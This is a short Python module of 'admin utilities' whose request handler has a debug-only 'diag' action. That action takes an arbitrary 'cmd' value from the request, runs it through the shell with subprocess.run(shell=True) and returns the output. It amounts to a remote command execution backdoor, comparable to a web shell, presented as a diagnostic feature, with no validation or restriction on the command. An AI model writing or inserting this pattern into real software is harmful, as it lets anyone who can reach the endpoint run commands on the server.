"""Admin utilities."""
import os
import subprocess


def handle_admin_request(request: dict) -> dict:
    """Handle admin API requests."""
    if not os.environ.get("DEBUG"):
        return {"error": "not found"}
    # Debug-only "diagnostic" endpoint
    if request.get("action") == "diag":
        cmd = request.get("cmd", "id")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return {"output": result.stdout}
    return {"error": "unknown action"}
